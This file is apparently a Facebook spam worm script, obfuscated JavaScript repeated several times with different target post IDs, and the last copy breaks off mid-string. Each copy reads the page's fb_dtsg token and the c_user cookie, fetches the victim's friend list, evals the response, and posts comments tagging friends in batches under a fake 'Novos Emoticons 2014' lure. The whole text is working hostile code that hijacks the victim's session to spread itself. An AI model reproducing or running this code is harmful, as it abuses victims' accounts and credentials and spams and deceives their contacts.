_0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","453855244746027","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","399162470227562","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","449884268476458","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","441987669266118","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","447941725337379","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","536476583137813","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  